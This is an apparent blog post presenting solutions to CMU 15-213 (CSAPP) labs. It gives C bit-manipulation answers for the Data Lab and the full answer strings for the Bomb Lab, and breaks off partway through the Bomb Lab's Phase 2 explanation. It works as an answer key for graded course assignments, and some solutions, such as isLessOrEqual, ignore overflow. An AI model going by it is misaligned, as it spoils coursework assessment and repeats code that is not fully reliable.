<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="This post is an archive for my personal solutions to the ten labs for the CMU 15213 course. You can access the self-study labs at the CSAPP official website.">
<meta property="og:type" content="article">
<meta property="og:title" content="Solutions to CMU 15213 Labs">
<meta property="og:url" content="http://sulley.cc/2024/09/01/20/06/index.html">
<meta property="og:site_name" content="Sulley">
<meta property="og:description" content="This post is an archive for my personal solutions to the ten labs for the CMU 15213 course. You can access the self-study labs at the CSAPP official website.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://sulley.cc/images/csapp/cachelab.png">
<meta property="article:published_time" content="2024-09-01T12:06:21.000Z">
<meta property="article:modified_time" content="2025-06-16T16:26:11.365Z">
<meta property="article:author" content="Sulley">
<meta property="article:tag" content="数学">
<meta property="article:tag" content="随笔">
<meta property="article:tag" content="计算机">
<meta property="article:tag" content="汇编">
<meta property="article:tag" content="硬件">
<meta property="article:tag" content="CSAPP">
<meta property="article:tag" content="CMU15213">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://sulley.cc/images/csapp/cachelab.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Solutions to CMU 15213 Labs</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/resources/">Resources</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/09/16/20/06/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/06/18/20/06/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://sulley.cc/2024/09/01/20/06/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://sulley.cc/2024/09/01/20/06/&text=Solutions to CMU 15213 Labs"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://sulley.cc/2024/09/01/20/06/&is_video=false&description=Solutions to CMU 15213 Labs"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Solutions to CMU 15213 Labs&body=Check out this article: http://sulley.cc/2024/09/01/20/06/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://sulley.cc/2024/09/01/20/06/&name=Solutions to CMU 15213 Labs&description=&lt;p&gt;This post is an archive for my personal solutions to the ten labs for
the CMU 15213 course. You can access the self-study labs at the CSAPP
official &lt;a href=&#34;https://csapp.cs.cmu.edu/3e/labs.html&#34;&gt;website&lt;/a&gt;.&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://sulley.cc/2024/09/01/20/06/&t=Solutions to CMU 15213 Labs"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-1-data-lab"><span class="toc-number">1.</span> <span class="toc-text">Lab 1: Data Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-2-bomb-lab"><span class="toc-number">2.</span> <span class="toc-text">Lab 2: Bomb Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-3-attack-lab"><span class="toc-number">3.</span> <span class="toc-text">Lab 3: Attack Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-4-cache-lab"><span class="toc-number">4.</span> <span class="toc-text">Lab 4: Cache Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-5-performance-lab"><span class="toc-number">5.</span> <span class="toc-text">Lab 5: Performance Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-6-shell-lab"><span class="toc-number">6.</span> <span class="toc-text">Lab 6: Shell Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-7-malloc-lab"><span class="toc-number">7.</span> <span class="toc-text">Lab 7: Malloc Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-8-proxy-lab"><span class="toc-number">8.</span> <span class="toc-text">Lab 8: Proxy Lab</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Solutions to CMU 15213 Labs
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Sulley</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-09-01T12:06:21.000Z" class="dt-published" itemprop="datePublished">2024-09-01</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA-%E5%9F%BA%E7%A1%80/">计算机 - 基础</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CMU15213/" rel="tag">CMU15213</a>, <a class="p-category" href="/tags/CSAPP/" rel="tag">CSAPP</a>, <a class="p-category" href="/tags/%E6%95%B0%E5%AD%A6/" rel="tag">数学</a>, <a class="p-category" href="/tags/%E6%B1%87%E7%BC%96/" rel="tag">汇编</a>, <a class="p-category" href="/tags/%E7%A1%AC%E4%BB%B6/" rel="tag">硬件</a>, <a class="p-category" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/" rel="tag">计算机</a>, <a class="p-category" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>This post is an archive for my personal solutions to the ten labs for
the CMU 15213 course. You can access the self-study labs at the CSAPP
official <a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/labs.html">website</a>.</p>
<span id="more"></span>
<h1 id="lab-1-data-lab">Lab 1: Data Lab</h1>
<p>This lab instructs you to write functions using bit-wise
operations.</p>
<p><strong>bixXor</strong></p>
<p>Implements <code>xor</code> using only <code>~</code> and
<code>&amp;</code>. The key is to notice that
<code>x | y == ~(~x &amp; ~y)</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int bitXor(int x, int y) {</span><br><span class="line">  return ~(~(~x &amp; y) &amp; ~(x &amp; ~y));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>tmin</strong></p>
<p>Returns the minimum two's complement integer.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int tmin(void) {</span><br><span class="line">  return 1 &lt;&lt; 31;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>isTmax</strong></p>
<p>Checks if the input is the maximum two's complement integer. Notice
that the maximum integer has a leading <code>0</code> and all remaining
bits are <code>1</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int isTmax(int x) {</span><br><span class="line">  return !((x + 1) ^ ~x) &amp; !!(x ^ ~0);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>Another way to think the maximum integer is, it's the only number
that equals to <code>0</code> when adding
<code>(1 &lt;&lt; 31) + 1</code>. So we can also use the following
simpler code:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int isTmax(int x) {</span><br><span class="line">  return !(x + (1 &lt;&lt; 31) + 1);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>allOddBits</strong></p>
<p>Checks if all odd index bits are set to 1. You can create a mask to
detect the pattern.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int allOddBits(int x) {</span><br><span class="line">  int m = (0xAA &lt;&lt; 8) + 0xAA;</span><br><span class="line">  m = (m &lt;&lt; 16) + m;</span><br><span class="line">  return !(m ^ (m &amp; x));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>negate</strong></p>
<p>Negates the input.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int negate(int x) {</span><br><span class="line">  return ~x + 1;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>isAsciiDigit</strong></p>
<p>Checks if the input is an ASCII digit, e.g., hex representation
between <code>0x30</code> and <code>0x39</code>. We can divide the
pattern into the parts. The first part is <code>0x30</code>, and the
second is <code>0x0?</code> where <code>?</code> can be <code>0</code>
to <code>9</code>. When examining the second part, the least significant
byte either does not exceed <code>1000</code> (<code>0x8</code>), or is
exactly <code>0x8</code> or <code>0x9</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int isAsciiDigit(int x) {</span><br><span class="line">  int y = 0xF &amp; x;</span><br><span class="line">  return !((0x30 ^ x) &gt;&gt; 4) &amp; (!(0x8 &amp; y) | !(0x8 ^ y) | !(0x9 ^ y));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>conditional</strong></p>
<p>Implements the conditional operator <code>x ? x : y</code>. Just use
mask to achieve it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int conditional(int x, int y, int z) {</span><br><span class="line">  int m = ~(!x) + 1;</span><br><span class="line">  return (~m &amp; y) | (m &amp; z);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>isLessOrEqual</strong></p>
<p>Checks if the first argument is less or equal than the second
argument. You can use <code>-x == ~x + 1</code> and examine the sign
bit.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int isLessOrEqual(int x, int y) {</span><br><span class="line">  return !(((~x + 1) + y) &gt;&gt; 31);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>logicalNeg</strong></p>
<p>Implements the <code>!</code> operator. That's, for any non-zero
number, it returns <code>0</code> and for zero it returns
<code>1</code>. If the input is negative (the sign bit is
<code>1</code>), or the input added with <code>-1</code> overflows then
the input is non-zero.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int logicalNeg(int x) {</span><br><span class="line">  return (((x &gt;&gt; 31) ^ 0x1) &amp; 0x1) &amp; ((((x + (~1 + 1)) &gt;&gt; 31) ^ 0x0) &amp; 0x1);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>howManyBits</strong></p>
<p>Returns the minimum number of bits required to represent the input
integer. Note that a positive integer implies a leading <code>0</code>
and a negative integer implies a leading <code>1</code>. Therefore in
either case, we must at least have a sign bit. We can safely invert all
bits of a negative integer and from the most significant bit to the
least significant bit find the index at which the bit is
<code>1</code>.</p>
<p>The trick here is to binary-search such index. To do this, we must
create several masks, shown as in the following code. For example,
<code>Mask_16 = 0xFFFF0000</code> detects whether any of the most
significant 16 bits is <code>1</code>. If so, it means the result is
<em>at least</em> 16. Then we can right shift the number 16 bits to
recursively examine the most significant 16 bits by applying
<code>Mask_8 = 0xFF00</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">int howManyBits(int x) {</span><br><span class="line">  int ToPositive = x ^ (x &gt;&gt; 31);</span><br><span class="line">  int Mask_0 = 0x1;</span><br><span class="line">  int Mask_1 = 0x2;</span><br><span class="line">  int Mask_2 = 0xC;</span><br><span class="line">  int Mask_4 = 0xF0;</span><br><span class="line">  int Mask_8 = 0xFF &lt;&lt; 8;</span><br><span class="line">  int Mask_16 = (Mask_8 | 0xFF) &lt;&lt; 16;</span><br><span class="line"></span><br><span class="line">  int Count, Result = 1;</span><br><span class="line">  Count = !!(ToPositive &amp; Mask_16) &lt;&lt; 4;</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_8) &lt;&lt; 3;</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_4) &lt;&lt; 2;</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_2) &lt;&lt; 1;</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_1);</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_0);</span><br><span class="line">  Result += Count;</span><br><span class="line"></span><br><span class="line">  return Result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>floatScale2</strong></p>
<p>Returns <code>2*f</code> where the input is interpreted as a
floating-point number. You should be careful about the border cases. If
the input number is NaN or infinity (i.e. the exponent is all ones), the
function returns the input as required. If the input is denormalized
(i.e. the exponent is all zeros), the input will be shifted left 1 bit.
If it's normalized (i.e. the exponent is neither all zeros nor all
zeros), we just add one to the exponent.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">unsigned floatScale2(unsigned uf) {</span><br><span class="line">  int MantissaMask = 0x7FFFFF,   Mantissa = MantissaMask &amp; uf;</span><br><span class="line">  int ExponentMask = 0xFF &lt;&lt; 23, Exponent = ExponentMask &amp; uf; </span><br><span class="line">  int Sign = (0x1 &lt;&lt; 31) &amp; uf;</span><br><span class="line"></span><br><span class="line">  int IsNaNOrInfinity = !(ExponentMask ^ Exponent);</span><br><span class="line">  int IsDenormalized = !(ExponentMask &amp; Exponent);</span><br><span class="line">  if (IsNaNOrInfinity) </span><br><span class="line">  {</span><br><span class="line">    return uf;</span><br><span class="line">  }</span><br><span class="line">  else if (IsDenormalized)</span><br><span class="line">  {</span><br><span class="line">    int ExceptSign = uf &lt;&lt; 1;</span><br><span class="line">    return Sign | ExceptSign;</span><br><span class="line">  }</span><br><span class="line">  else </span><br><span class="line">  {</span><br><span class="line">    int NewExponent = ExponentMask &amp; (Exponent + (1 &lt;&lt; 23));</span><br><span class="line">    return Sign | NewExponent | Mantissa;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>floatFloat2Int</strong></p>
<p>Returns bit-level equivalent of <code>(int) x</code> where
<code>x</code> is interpreted as a floating number. Be aware of the
border cases: (1) if the input is zero, the function also returns zero;
(2) if the input is NaN or infinity, it returns <code>0x80000000u</code>
as required; (3) if the input is denormalized, it returns zero; (4) if
the input is normalized, determine the result by checking the
exponent.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">int floatFloat2Int(unsigned uf) {</span><br><span class="line">  int MantissaMask = 0x007FFFFF, Mantissa = MantissaMask &amp; uf;</span><br><span class="line">  int ExponentMask = 0x7F800000, Exponent = ExponentMask &amp; uf; </span><br><span class="line">  int SignMask     = 0x80000000, Sign     = SignMask &amp; uf;</span><br><span class="line">  </span><br><span class="line">  int Exp = (Exponent &gt;&gt; 23) - 127, Result, i, BitMask; </span><br><span class="line">      </span><br><span class="line">  int IsNaNOrInfinity = !(ExponentMask ^ Exponent);</span><br><span class="line">  int IsDenormalized = !(ExponentMask &amp; Exponent);</span><br><span class="line">  int IsNegative = !(SignMask ^ Sign);</span><br><span class="line"></span><br><span class="line">  // Is +0 or -0</span><br><span class="line">  if (!(uf &lt;&lt; 1))</span><br><span class="line">  {</span><br><span class="line">    return 0;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  // Is NaN or infinity.</span><br><span class="line">  if (IsNaNOrInfinity)</span><br><span class="line">  {</span><br><span class="line">    return 0x80000000u;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  // Is denormalized</span><br><span class="line">  if (IsDenormalized)</span><br><span class="line">  {</span><br><span class="line">    return 0;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  // Is normalized</span><br><span class="line">  if (Exp &lt; 0)</span><br><span class="line">  {</span><br><span class="line">    return 0;</span><br><span class="line">  }</span><br><span class="line">  if (Exp &gt;= 31)</span><br><span class="line">  {</span><br><span class="line">    return 0x80000000u;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  Result = 1 &lt;&lt; Exp;</span><br><span class="line">  Exp -= 1;</span><br><span class="line">  for (i = 22; i &gt;= 0 &amp;&amp; Exp &gt;= 0; --i, --Exp)</span><br><span class="line">  {</span><br><span class="line">    BitMask = !!(Mantissa &amp; (1 &lt;&lt; i));</span><br><span class="line">    Result += BitMask * (1 &lt;&lt; Exp);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  if (IsNegative)</span><br><span class="line">  {</span><br><span class="line">    Result = -Result;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  return Result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>floatPower2</strong></p>
<p>Returns <code>2.0^x</code> for any given integer <code>x</code>. The
smallest non-zero floating (denormalized) number is
<code>2^(-126+23)=2^(-149)</code>. So if the input is smaller than
<code>-149</code>, the functions should return <code>0</code>. The
largest denormalized floating number in the form of <code>2.0^x</code>
is <code>x^(-127)</code>. In the range of <code>-149</code> and
<code>-127</code>, we just left shift one by <code>x+149</code>. The
smallest normalized number (also, in the form of <code>2.0^x</code>) is
<code>2^(-126)</code> and the largest is
<code>2^(254-127)=2^(127)</code>. In this case, we left shift
<code>x+127</code> by <code>23</code> to occupy the exponent part. If
<code>x</code> exceeds <code>127</code>, the function returns
<code>+INF</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unsigned floatPower2(int x) {</span><br><span class="line">  if (x &lt; -149)</span><br><span class="line">  {</span><br><span class="line">    return 0;</span><br><span class="line">  }</span><br><span class="line">  else if (x &lt;= -127)</span><br><span class="line">  {</span><br><span class="line">    return 1 &lt;&lt; (x + 149);</span><br><span class="line">  }</span><br><span class="line">  else if (x &lt;= 127)</span><br><span class="line">  {</span><br><span class="line">    return (x + 127) &lt;&lt; 23;</span><br><span class="line">  }</span><br><span class="line">  else // x &gt; 127</span><br><span class="line">  {</span><br><span class="line">    return 0x7F800000;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<h1 id="lab-2-bomb-lab">Lab 2: Bomb Lab</h1>
<p>The answers to the six phases are respectively:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">7 0</span><br><span class="line">iOnUvW</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<p>If we deciphered the secret phase, the answers will be (adding string
<code>DrEvil</code> after the third line):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">7 0 DrEvil</span><br><span class="line">iOnUvW</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<p>Note that some of the answers are not unique. Let's quickly go
through these phases.</p>
<p><strong>Phase 1</strong></p>
<p>Find the string at address <code>0x402400</code>. You can use
<code>x/s 402400</code> to extract it!</p>
<p><strong>Phase 2</strong></p>
<p>The key to solve this phase is know the functionality of each
register:</p>
<ul>
<li><code>%rdi</code>: the first argument.</li>
<li><code>%rsi</code>: the second argument.</li>
<li><code>%rdx</code>: the third argument.</li>
<li><code>%rcx</code>: the forth argument.</li>
